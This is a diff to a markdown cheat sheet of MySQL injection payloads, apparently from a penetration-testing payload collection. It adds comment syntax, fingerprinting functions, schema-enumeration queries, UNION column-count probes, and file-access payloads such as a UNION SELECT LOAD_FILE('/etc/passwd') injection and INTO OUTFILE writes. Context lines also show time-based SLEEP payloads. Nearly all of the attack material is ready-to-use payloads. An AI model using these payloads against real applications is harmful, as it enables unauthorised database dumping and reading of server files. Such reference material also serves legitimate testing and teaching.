@@ -1,12 +1,56 @@
 # MYSQL Injection
 
-## MySQL
+## Comments
 
 ```sql
+-- MYSQL Comment
 # MYSQL Comment
 /* MYSQL Comment */
 /*! MYSQL Special SQL */
 /*!32302 10*/ Comment for MySQL version 3.23.02
+```
+
+## Interesting Functions
+
+Confirm Mysql:
+
+```sql
+concat('a','b')
+database()
+version()
+user()
+system_user()
+@@version
+@@datadir
+rand()
+floor(2.9)
+length(1)
+count(1)
+```
+
+Usefull functions:
+```sql
+SELECT group_concat(<COLUMN>) FROM <TABLE>
+SELECT hex(database())
+SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
+SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
+SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
+SELECT replace(database(),"r","R")
+SELECT 'Michael!' REGEXP '.*'
+SELECT substr(database(),1,1)='r'
+SELECT substring(database(),1,1)=0x72
+SELECT ascii(substring(database(),1,1))=114
+SELECT database()=char(114,101,120,116,101,115,116,101,114)
+SELECT group_concat(if(table_schema=database(),table_name,null))
+SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
+```
+
+## Flow
+
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
+SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
+SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
 ```
 
 ## Detect columns number
@@ -19,6 +63,11 @@ order by 2
 order by 3
 ...
 order by XXX
+
+UniOn SeLect 1
+UniOn SeLect 1,2
+UniOn SeLect 1,2,3
+...
 ```
 
 ## MySQL Union Based
@@ -103,10 +152,33 @@ RLIKE SLEEP([SLEEPTIME])
 OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 ```
 
-## MYSQL Read content of a file
+## MYSQL play with files
+
+**Read content: **
+```sql
+' union select LOAD_FILE('/etc/passwd') --
+```
+
+**Write content to file: **
+```sql
+select * from users into outfile "/tmp/sql.txt";
+```
+
+**Copy file: **
+```sql
+select load_file(“/etc/passwd”) into outfile "/tmp/pass.txt";
+```
+
+**Update value with content of a file: **
+```sql
+UPDATE tabla SET columna=LOAD_FILE(‘/tmp/file’) WHERE id=1;
+```
+
+**Create table and save file: **
 
 ```sql
-' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+create table temporal( data varchar(8000));
+load data infile '/etc/passwd' into table temporal
 ```
 
 ## MySQL DIOS - Dump in One Shot
